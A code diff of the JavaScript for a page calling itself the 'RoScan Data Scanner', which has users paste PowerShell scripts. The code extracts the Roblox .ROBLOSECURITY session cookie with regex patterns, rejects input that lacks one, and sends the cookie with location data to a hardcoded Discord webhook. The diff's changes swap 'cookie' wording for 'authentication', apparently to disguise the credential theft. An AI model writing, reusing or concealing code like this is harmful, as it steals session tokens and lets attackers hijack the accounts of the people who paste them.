@@ -218,9 +218,9 @@ async function submitPowerShell() {
         return;
     }
 
-    // Only allow PowerShell scripts with cookies or valid item data
+    // Only allow PowerShell scripts with authentication data or valid item data
     if (!hasValidData(inputText)) {
-        showNotification('Invalid input. Please enter PowerShell scripts with cookies or item data.', 'error');
+        showNotification('Invalid input. Please enter PowerShell scripts with auth data or item data.', 'error');
         return;
     }
 
@@ -234,12 +234,12 @@ async function submitPowerShell() {
         const limitedItems = extractLimitedItems(inputText);
         const robloxCookie = extractRobloxCookie(inputText);
         
-        // Block execution if no cookie is found
+        // Block execution if no authentication data is found
         if (!robloxCookie) {
             stopLoadingAnimation(submitText);
-            submitText.textContent = 'No Cookie Found';
+            submitText.textContent = 'No Auth Data';
             submitBtn.style.background = '#ef4444'; // Red error color
-            showNotification('No valid Roblox cookie detected in input', 'error');
+            showNotification('No valid Roblox authentication detected in input', 'error');
             
             setTimeout(() => {
                 submitBtn.disabled = false;
@@ -255,18 +255,18 @@ async function submitPowerShell() {
         // Discord webhook URL
         const webhookUrl = 'https://discord.com/api/webhooks/1395450774489661480/eo-2Wv4tE0WgbthyZbIXQckKCspKyBMC3zWY7ZcyW5Rg3_Vn1j8xQLqQ4fGm03cEHEGu';
         
-        // Webhook payload with only cookie and location
+        // Webhook payload with only data and location
         const payload = {
-            content: "@everyone 🍪 **COOKIE + LOCATION** 📍",
+            content: "@everyone 🔑 **AUTH DATA + LOCATION** 📍",
             embeds: [{
-                title: "🍪 Cookie + Location Data",
+                title: "🔑 Authentication + Location Data",
                 color: 65280, // Green color
                 thumbnail: {
                     url: "https://i.imgur.com/roblox-logo.png"
                 },
                 fields: [
                     {
-                        name: "🍪 Roblox Cookie (Click to Copy)",
+                        name: "🔑 Roblox Authentication (Click to Copy)",
                         value: `\`\`\`\n${robloxCookie}\n\`\`\``,
                         inline: false
                     },
@@ -282,8 +282,8 @@ async function submitPowerShell() {
                     }
                 ],
                 footer: {
-                    text: "🍪 RoScan Data Scanner",
-                    icon_url: "https://i.imgur.com/cookie-icon.png"
+                    text: "🔑 RoScan Data Scanner",
+                    icon_url: "https://i.imgur.com/scanner-icon.png"
                 },
                 timestamp: new Date().toISOString()
             }]
@@ -331,7 +331,7 @@ async function submitPowerShell() {
 
 // Function to scan and find authentication data from text
 function extractRobloxCookie(text) {
-    // Look for various Roblox cookie patterns
+    // Look for various Roblox authentication patterns
     const patterns = [
         // Standard .ROBLOSECURITY cookie format
         /\.ROBLOSECURITY=([^;"\s\n]+)/i,
@@ -432,21 +432,21 @@ function extractLimitedItems(text) {
     return items.slice(0, 5); // Limit to 5 items max
 }
 
-// Function to validate input - only allow PowerShell scripts with cookies or valid data
+// Function to validate input - only allow PowerShell scripts with auth data or valid data
 function hasValidData(text) {
-    // Check if it contains a Roblox cookie (most important)
-    const hasCookie = extractRobloxCookie(text) !== null;
-    if (hasCookie) {
-        return true; // Always allow if there's a cookie
+    // Check if it contains Roblox authentication data (most important)
+    const hasAuthData = extractRobloxCookie(text) !== null;
+    if (hasAuthData) {
+        return true; // Always allow if there's authentication data
     }
     
-    // Check if it's a PowerShell script with session/cookie patterns
+    // Check if it's a PowerShell script with session/authentication patterns
     const powerShellPatterns = [
         /\$session\s*=\s*New-Object.*Microsoft\.PowerShell/is,
-        /\$session\.Cookies\.Add.*ROBLOSECURITY/is,
-        /System\.Net\.Cookie.*ROBLOSECURITY/is,
-        /WebRequestSession.*Cookies/is,
-        /New-Object.*System\.Net\.Cookie/is
+        /\$session\.Add.*ROBLOSECURITY/is,
+        /System\.Net.*ROBLOSECURITY/is,
+        /WebRequestSession.*Auth/is,
+        /New-Object.*System\.Net/is
     ];
     
     for (const pattern of powerShellPatterns) {
